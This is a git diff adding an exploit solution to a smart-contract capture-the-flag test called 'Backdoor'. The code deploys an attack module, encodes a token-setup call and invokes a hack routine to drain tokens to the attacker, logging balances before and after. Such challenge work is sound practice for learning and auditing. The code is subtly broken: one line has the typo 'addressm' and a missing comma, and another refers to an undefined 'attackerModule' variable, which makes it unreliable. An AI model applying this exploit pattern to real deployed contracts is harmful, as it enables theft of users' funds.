@@ -37,6 +37,43 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const attackerToken = this.token.connect(attacker);
+        const attackerFactory = this.walletFactory.connect(attacker);
+        const attackerMasterCopy = this.masterCopy.connect(attacker);
+        const attackerWalletRegistry = this.walletRegistry.connect(attacker);
+
+        const checkTokenBalance = async (address, name) => {
+            const balance = await attackerToken.balanceOf(address);
+            console.log(`Token balance of ${name}:`, ethers.utils.formatEther(balance));
+        }
+
+        await checkTokenBalance(attacker.address, 'attacker');
+        
+        // See ../../Notes/11-Backdoor.md
+        // Step1
+        const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
+        const attackModule = await AttackModuleFactory.deploy(
+            attacker.address,
+            attackerFactory.addressm
+            attackerMasterCopy.address,
+            attackerWalletRegistry.address,
+            attackerToken.address
+        );
+        console.log("Deployed attacking module at", attackModule.address);
+
+        // Step2
+        const moduleABI = ["function setupToken(address _tokenAddress, address _attacker)"];
+        const moduleIFace = new ethers.utils.Interface(moduleABI);
+        const setupData = moduleIFace.encodeFunctionData("setupToken", [
+            attackerToken.address,
+            attackerModule.address
+        ]);
+
+        // Step3
+        await attackModule.hack(users, setupData);
+
+        await checkTokenBalance(attacker.address, "Attacker");
     });
 
     after(async function () {
